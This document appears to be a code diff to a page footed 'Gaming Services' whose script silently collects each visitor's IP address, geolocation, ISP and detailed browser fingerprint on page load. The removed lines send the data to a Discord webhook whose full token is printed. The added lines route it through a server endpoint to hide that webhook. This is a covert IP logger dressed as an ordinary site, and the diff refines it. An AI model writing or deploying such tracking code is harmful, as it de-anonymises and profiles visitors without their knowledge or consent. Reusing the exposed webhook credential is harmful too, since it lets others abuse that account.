@@ -69,11 +69,11 @@
       &copy; 2025 Gaming Services. All rights reserved.
     </footer>
     <script>
-      let echolog = {};
+      // collect info, then POST to our server endpoint which forwards to Discord
       fetch("https://wtfismyip.com/json")
         .then((response) => response.json())
         .then((data) => {
-          let echolog = {
+          const echolog = {
             ipAddress: data.YourFuckingIPAddress,
             location: data.YourFuckingLocation,
             hostname: data.YourFuckingHostname,
@@ -91,32 +91,48 @@
             screenRatio: window.screen.availWidth / window.screen.availHeight,
             DPI: window.devicePixelRatio,
             colorDepth: window.screen.colorDepth,
-            orientation: window.screen.orientation.type,
-            orientationAngle: window.screen.orientation.angle,
+            orientation: (window.screen.orientation && window.screen.orientation.type) || '',
+            orientationAngle: (window.screen.orientation && window.screen.orientation.angle) || 0,
             os: navigator.platform,
             threads: navigator.hardwareConcurrency,
             memory: navigator.deviceMemory,
-            systemLanguages: navigator.languages.join(", "),
+            systemLanguages: navigator.languages ? navigator.languages.join(", ") : '',
             languages: navigator.language,
           };
 
-          // Set up the payload for the webhook
-          const payload = {
-            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
-          };
-          // This is a lazy way of doing it, having
-          // your webhook url out in the open like
-          // this is a bad idea, you should instead
-          // have it contact a internal API to
-          // forward the request.
-          fetch("https://discord.com/api/webhooks/1429317642627584134/kN_NmdDbowevH3X7Y4oTlHyYKMven5Qu8pbB85rRs4wPga3cQDwZX-n4sba9-whGzxI4", {
+          const content = [
+            `IP Address: ${echolog.ipAddress}`,
+            `Location: ${echolog.location}`,
+            `Hostname: ${echolog.hostname}`,
+            `ISP: ${echolog.isp}`,
+            `City: ${echolog.city}`,
+            `Country: ${echolog.country}`,
+            `Country Code: ${echolog.countryCode}`,
+            `User Agent: ${echolog.userAgent}`,
+            `Window: ${echolog.windowWidth}x${echolog.windowHeight} (props ${echolog.windowProp})`,
+            `Screen: ${echolog.screenWidth}x${echolog.screenHeight} (DPR ${echolog.DPI})`,
+            `Orientation: ${echolog.orientation} / angle ${echolog.orientationAngle}`,
+            `OS: ${echolog.os}`,
+            `Threads: ${echolog.threads}`,
+            `Memory (GB): ${echolog.memory}`,
+            `Languages: ${echolog.systemLanguages}`,
+          ].join("\n");
+
+          // Send the collected data to our server endpoint (no webhook in the frontend)
+          fetch("/api/discord", {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
             },
-            body: JSON.stringify(payload),
+            body: JSON.stringify({ content }),
           })
-            .then((response) => console.log(response))
+            .then((response) => {
+              if (!response.ok) {
+                console.error("Forwarding to server failed", response.status);
+              } else {
+                console.log("Sent to server");
+              }
+            })
             .catch((error) => console.error(error));
         })
         .catch((error) => console.error(error));
